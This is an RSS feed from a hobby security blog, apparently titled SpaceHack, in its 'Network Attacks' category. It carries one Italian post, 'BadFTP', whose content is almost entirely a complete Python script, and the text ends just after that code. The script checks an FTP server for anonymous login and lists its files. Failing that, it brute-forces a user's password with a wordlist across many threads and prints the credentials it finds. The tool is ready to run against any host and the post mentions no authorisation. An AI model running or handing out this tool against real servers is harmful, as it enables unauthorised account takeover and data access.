<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Network Attacks on HomePage</title>
    <link>https://kobra3390.github.io/SpaceHack/categories/network-attacks/</link>
    <description>Recent content in Network Attacks on HomePage</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language><atom:link href="https://kobra3390.github.io/SpaceHack/categories/network-attacks/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>BadFTP, quando FTP diventa &#39;BAD&#39;</title>
      <link>https://kobra3390.github.io/SpaceHack/posts/badftp-quando-ftp-diventa-bad/badftp_quando_ftp_diventa_bad/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://kobra3390.github.io/SpaceHack/posts/badftp-quando-ftp-diventa-bad/badftp_quando_ftp_diventa_bad/</guid>
      <description>Introduzione a BadFTP Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: Brute Force di un Server FTP. Col tempo però, ho sentito l&amp;rsquo;esigenza di modificare lo script per renderlo in un certo senso modulabile.
Da qui nasce BadFTP.py:
import sys, ftplib, threading from ftplib import FTP from colorama import init, Fore, Style init() credentials_found = False port = 21 def banner(): print(f&amp;#34;&amp;#34;&amp;#34;{Style.</description>
      <content>&lt;h1 id=&#34;introduzione-a-badftp&#34;&gt;Introduzione a BadFTP&lt;/h1&gt;
&lt;p&gt;Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: &lt;a href=&#34;https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/&#34;&gt;Brute Force di un Server FTP&lt;/a&gt;. Col tempo però, ho sentito l&amp;rsquo;esigenza di modificare lo script per renderlo in un certo senso &lt;code&gt;modulabile&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Da qui nasce &lt;code&gt;BadFTP.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; threading
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; ftplib &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; FTP
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; colorama &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; init, Fore, Style

init()
credentials_found &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
port &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;banner&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                    
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;     _____       _ _____ _____ _____ 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    | __  |___ _| |   __|_   _|  _  |
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    | __ -| .&amp;#39;| . |   __| | | |   __|
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    |_____|__,|___|__|    |_| |__|   
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;                                 
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;        &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;check_anonymous_ftp&lt;/span&gt;(server, port&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        ftp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FTP()
        ftp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(server, port)
        ftp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anonymous&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;anonymous@domain.com&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ftp  
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_correct&lt;/span&gt;(username, password):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; credentials_found

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; credentials_found:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;

    server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;FTP()
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Trying &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;connect(host, port, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        server&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;login(username, password)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; ftplib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;error_perm:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Found credentials: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Host: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;username&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Password: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;password&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        credentials_found &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_ftp_directory&lt;/span&gt;(ftp):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Contents of the root directory:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        contents &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ftp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nlst()
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; item &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; contents:
            print(item)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RED&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Error listing directory: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;str(e)&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;password_checker&lt;/span&gt;(username, passwords):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; passwords:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; is_correct(username, password):
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    banner()
    init(autoreset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        print(Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RED &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Usage: python3 script.py ftp_server_ip_address username wordlist_file&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

    host &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
    user &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]
    wordlist_file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;]

    ftp_client &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; check_anonymous_ftp(host)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ftp_client:
        print(Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The FTP server at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;GREEN&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;allows anonymous access.&amp;#39;&lt;/span&gt;)
        list_ftp_directory(ftp_client) 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        print(Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RED &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The FTP server at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[ &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;host&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ]&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Fore&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RED&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;does not allow anonymous access or is unreachable.&amp;#39;&lt;/span&gt;)

        passwords &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(wordlist_file)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Passwords to try: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BRIGHT&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;len(passwords)&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;Style&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;RESET_ALL&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)

        chunk_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
        password_chunks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [passwords[i:i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;chunk_size] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(passwords), chunk_size)]

        threads &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; chunk &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; password_chunks:
            thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; threading&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Thread(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;password_checker, args&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(user, chunk,))
            thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()
            threads&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(thread)

        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; thread &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; threads:
            thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join()
